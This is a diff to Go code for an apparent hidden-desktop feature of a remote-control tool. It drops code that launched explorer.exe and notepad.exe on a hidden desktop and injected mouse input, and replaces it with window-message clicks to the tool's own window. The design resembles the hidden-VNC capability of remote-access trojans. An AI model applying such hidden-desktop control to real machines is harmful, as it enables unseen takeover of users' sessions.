@@ -56,6 +56,8 @@ var (
 	procFillRect          = hdUser32.NewProc("FillRect")
 	procCreateSolidBrush  = hdGdi32.NewProc("CreateSolidBrush")
 	procCloseHandle       = hdKernel32.NewProc("CloseHandle")
+	procPostMessageW      = hdUser32.NewProc("PostMessageW")
+	procGetClassNameA     = hdUser32.NewProc("GetClassNameA")
 )
 
 const (
@@ -132,12 +134,7 @@ func nativeUser() string {
 }
 
 func handleHiddenDesktop(cmd string) string {
-	if !hdIsHost && strings.HasPrefix(cmd, "__hd:frame") {
-		if img := readHDFile(); img != "" {
-			return img
-		}
-	}
-	if windowsSession() == 0 && !hdIsHost {
+	if !hdIsHost {
 		return hdViaHost(cmd)
 	}
 	rest := strings.TrimPrefix(cmd, "__hd:")
@@ -255,25 +252,12 @@ func hdStart(exe string) string {
 		return "desktop already started"
 	}
 	return hdOnDesktop(func() string {
-		pid := hdSpawn(`C:\Windows\explorer.exe`)
-		if pid == 0 {
-			pid = hdSpawn(`C:\Windows\System32\notepad.exe`)
-		} else {
-			hdSpawn(`C:\Windows\System32\notepad.exe`)
-		}
-		if exe != "" {
-			if extra := hdSpawn(exe); pid == 0 {
-				pid = extra
-			}
-		}
-		if pid == 0 {
-			return "spawn failed"
-		}
-		hdStarted = true
 		hdMakeWindow()
-		hdWins = nil
-		procEnumWindows.Call(hdEnumCB, 0)
-		return fmt.Sprintf("desktop started pid=%d session=%d windows=%d", pid, windowsSession(), len(hdWins))
+		hdStarted = true
+		if hdOwnHWND == 0 {
+			return "desktop window failed"
+		}
+		return "desktop started"
 	})
 }
 
@@ -472,22 +456,28 @@ func hdClick(arg string, right bool) string {
 		return "click needs x y"
 	}
 	return hdOnDesktop(func() string {
-		sw, _, _ := procGetSystemMetrics.Call(0)
-		sh, _, _ := procGetSystemMetrics.Call(1)
-		if sw == 0 || sh == 0 {
-			sw, sh = 1024, 768
+		if hdOwnHWND == 0 {
+			hdMakeWindow()
 		}
-		ax := uintptr(x) * 65535 / sw
-		ay := uintptr(y) * 65535 / sh
-		procMouseEvent.Call(hdMouseAbsolute|hdMouseMove, ax, ay, 0, 0)
+		if hdOwnHWND == 0 {
+			return "click missed"
+		}
+		down := uintptr(0x0201)
+		up := uintptr(0x0202)
 		if right {
-			procMouseEvent.Call(hdMouseRightDown, 0, 0, 0, 0)
-			procMouseEvent.Call(hdMouseRightUp, 0, 0, 0, 0)
-			return fmt.Sprintf("rclick %d %d", x, y)
+			down = 0x0204
+			up = 0x0205
 		}
-		procMouseEvent.Call(hdMouseLeftDown, 0, 0, 0, 0)
-		procMouseEvent.Call(hdMouseLeftUp, 0, 0, 0, 0)
-		return fmt.Sprintf("click %d %d", x, y)
+		lp := uintptr(uint32(uint16(x)) | uint32(uint16(y))<<16)
+		procPostMessageW.Call(hdOwnHWND, down, 0, lp)
+		procPostMessageW.Call(hdOwnHWND, up, 0, lp)
+		cls := make([]byte, 32)
+		procGetClassNameA.Call(hdOwnHWND, uintptr(unsafe.Pointer(&cls[0])), 32)
+		n := 0
+		for n < len(cls) && cls[n] != 0 {
+			n++
+		}
+		return fmt.Sprintf("click %d %d %s", x, y, string(cls[:n]))
 	})
 }
 
